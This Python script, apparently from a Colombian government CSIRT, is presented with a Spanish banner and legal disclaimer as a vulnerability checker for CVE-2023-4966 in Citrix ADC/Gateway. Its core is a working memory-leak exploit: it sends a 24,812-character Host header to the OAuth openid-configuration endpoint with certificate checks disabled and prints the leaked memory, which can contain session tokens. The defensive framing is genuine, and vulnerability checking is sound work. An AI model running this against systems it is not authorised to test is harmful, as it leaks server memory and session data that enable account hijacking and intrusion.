#!/usr/bin/env python3
# Escrito por Ing.Martin

import sys
import requests
import urllib3
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore, Back, Style

print(f"""
   ___  ___  __  __ ___  _______     ______   __ ___   ____  ___  __  __ ___   ____  ___   _   ___  __   ______ 
  / __|/ __||  ||  |\  \|__   __|   |  |\  \ |  |\  \ |  __|/ __||  ||  |\  \ |  __||   \ | | / __||  | /  /\  \ 
 | (__ \__ \|  ||  |/  /   | |      |  |/__/ |  |/  / |  __|\__ \|  ||  | |  ||  __|| |\ \| || (__ |  ||  |__|  |
  \___||___/|__||__|\__\   |_|      |  |     |__|\__\ |____||___/|__||__|/__/ |____|| | \ __| \___||__||__|  |__|
    {Fore.RED}csirt@presidencia.gov.co{Style.RESET_ALL}
  -Validador para el CVE-2023-4966 {Fore.RED}[www.csirt.presidencia.gov.co]{Style.RESET_ALL}                                                              
""")

print (f"""{Fore.RED}Aviso Legal y Descargo de Responsabilidad{Style.RESET_ALL} 
El presente archivo es para ser usado con fines legitimos, para validar la seguridad de la configurtacion de los sitios
y servicios soportados en CITRIX.
       
No nos hacemos responsables del mal uso que se le pueda dar a la presente herramienta.
       
El uso ilegitimo de la presente herramienta podria llevarle a consecuencias penales y/o administrativas de acuerdo a la 
Ley 1273/2009.
""")
print (f"{Fore.RED}Ingrese 1 para continuar o 2 para salir{Style.RESET_ALL}")
opcion = input()
opcion = int(opcion)

if opcion == 1:
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', help='The Citrix ADC / Gateway, excluyendo el segmento de red local (e.g. 192.168.1.200)')
    args = parser.parse_args()

    if args.target is None:
        print('Indique un target (ejemplo --target 172.16.1.3)')
        sys.exit(0)

    hostname = args.target

    if __name__ == "__main__":
        headers = {
            "Host": "A"*24812
        }
        r = requests.get(f"https://{hostname}/oauth/idp/.well-known/openid-configuration", headers=headers, verify=False,timeout=10)
        d = requests.get(f"https://{hostname}/oauth/idp/.well-known/openid-configuration", verify=False,timeout=10)
        if r.status_code == 200:
            print(f"{Fore.RED}--- Memoria Volcada !!! ---{Style.RESET_ALL}")
            print(r.text[131050:])
            print(f" {Fore.RED}El acceso es vulnerable - El Servidor es Vulnerable a CVE-2023-4966 {Style.RESET_ALL}")
            print(f"{Fore.RED}Un atacante podria acceder con mucha facilidad{Style.RESET_ALL}")
            print("---     Fin de la Consulta    ---")
            print("--- Verificador de vulnerabilidad CVE-2023-4966 ---")

        elif d.status_code == 200:
                print(f"{Fore.YELLOW}--- Acceso al Path vulnerable encontrado !!! ---{Style.RESET_ALL}")
                print(d.text)
                print(f" {Fore.YELLOW}El acceso es parcialmente vulnerable - El Servidor puede ser atacado mediante CVE-2023-4966 {Style.RESET_ALL}")
                print(f" {Fore.YELLOW}Un atacante podria acceder con poco de esfuerzo{Style.RESET_ALL}")
                print("---     Fin de la Consulta    ---")
                print("--- Verificador de vulnerabilidad CVE-2023-4966 ---")
        else:
            print(f"{Fore.GREEN} No es posible volcar la memoria - NO es vulnerable a CVE-2023-4966{Style.RESET_ALL}")
            print(f"{Fore.GREEN} Pero ningun sistema es 100% seguro - No bajes la guardia{Style.RESET_ALL}")
else:
    print(f"{Fore.GREEN} Proceso Terminado con Exito{Style.RESET_ALL}")
